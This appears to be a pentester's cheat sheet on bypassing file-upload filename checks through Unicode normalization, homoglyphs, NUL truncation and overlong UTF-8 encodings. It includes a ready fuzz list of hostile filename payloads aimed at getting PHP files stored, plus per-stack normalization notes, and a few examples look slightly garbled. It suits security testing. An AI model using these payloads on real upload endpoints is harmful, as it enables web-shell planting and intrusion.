# Unicode & Normalization — names that change between check and store

## The principle — the checked string isn't the stored string

Unicode names get normalized somewhere in the pipeline — browser, WAF,
framework, filesystem. If the validator reads pre-normalization and the
store writes post-, the strings differ.

## The fullwidth/homoglyph family — NFKC folds these

```
． (U+FF0E fullwidth full stop)  → .        x．php → x.php
／ (U+FF0F fullwidth slash)      → /        ..／..／x
＼ (U+FF3C fullwidth backslash)  → \
： (U+FF1A fullwidth colon)      → :
․ (U+2024 one dot leader)        → .        x․php
‥ (U+2025 two dot leader)        → ..       ‥/x.php
/ (U+2044 fraction slash)        → sometimes /
．．／．．／                     → ../.. /
```

NFKC-normalizing stacks: Python `unicodedata.normalize('NFKC')`, Java
`Normalizer`, Windows (partial), `secure_filename` (strips rather than
normalizes), Node `String.normalize`.

## Case folding — the `.ΡHP` family

- Greek/Cyrillic homoglyphs: `x.ρhp` (rho) `x.hp` (cyrillic er) —
  visually identical, byte-different — a `php$` regex misses; the
  filesystem stores the real char
- `İ` (U+0130 Turkish dotted I) lowercases to `i̇` — length change
- `ß` → `ss` — `.pßp` vs `.php`? no — but in longer names it shifts
- Kelvin `K`→`k`, Angstrom `Å`→`Å` — symbol-vs-letter folds

## Nulls and controls — the truncation family

```
x.php%00.jpg            # NUL truncates on C-level ops
x.php\x00.jpg
x.php<U+0000>.jpg
x.ph\u0000p             # split mid-word
x.php<U+2028>.jpg       # line separator — some parsers treat as newline
x.php<U+FEFF>.jpg       # BOM/ZWNBSP — stripped or kept?
x.php<U+00AD>.jpg       # soft hyphen — invisible, some strips
```

## Overlong UTF-8 / alternate encodings

```
..%c0%af..%c0%afx.php   # overlong '/' — decoded by non-strict decoders
..%e0%80%afx.php        # 3-byte overlong
%c0%ae%c0%ae/           # overlong '.' 
%ef%bc%8e (U+FF0E bytes) # raw fullwidth
```

Java `URLDecoder` decodes `%c0%af` to the overlong bytes; some stacks
reject; some paths pass through to a filesystem that interprets.

## Surrogate pairs / combining marks

- `x.ph\u0301p` — combining acute after `h` — the string "looks" like
  `x.phṕ` but bytes differ; a substring check `php` passes? `ph\u0301p`
  does NOT contain `php` literally — the check passes, the file lands
  `x.phṕ` — dead end unless normalization merges the mark
- `x.ph\xcc\x81p` — raw combining bytes
- ZWJ/ZWNJ inside the name — invisible; strips on some pipelines

## IDN-style tricks — when a name becomes a URL

`x.punycode.xn--php` — if the filename feeds a URL/domain (serve URL
construction), punycode decoding may alter it.

## Where normalization happens — the check-vs-store split

| Stack | Normalization point |
|---|---|
| PHP | `$_FILES['name']` raw; `pathinfo` raw; filesystem raw — no auto-norm |
| Python | `secure_filename` strips non-ascii by default! `Path(name)` raw |
| Node | raw string; `String.normalize` only if called |
| Java | `getSubmittedFileName` — Servlet 3.1+ strips path; Normalizer manual |
| .NET | `IFormFile.FileName` — `ContentDispositionHeaderValue` decodes + strips path per RFC |
| Go | `mime/multipart` `FileName` keeps raw (pre-1.20); `path.Base` strip in newer |

## The fuzz list — send these as `filename=`

```
x.php%00.jpg
x.php\x00.jpg
x.pＨp              (fullwidth H)
x.phṗ
x．php             (fullwidth dot)
x․php              (one-dot leader)
..／x.php          (fullwidth slash)
x.php%AD.jpg       (incomplete seq)
x.php%FF.jpg
x.php;.jpg
x.jpg:shell.php
x.php<U+200B>.jpg  (ZWSP)
x.php<U+0000>.jpg
```

Each has a *theoretical* reach: homoglyph — check-bypass; fullwidth —
NFKC pipeline; NUL — truncation; `;` — parser split; `:` — ADS/param.

## Falsifiers

- the pipeline is raw-bytes end-to-end — no normalization anywhere
- `basename`/`Path.name`/`secure_filename` strips everything non-literal
  before both check and store

## Output to record

- the exact codepoint(s) that produced the check-vs-store split
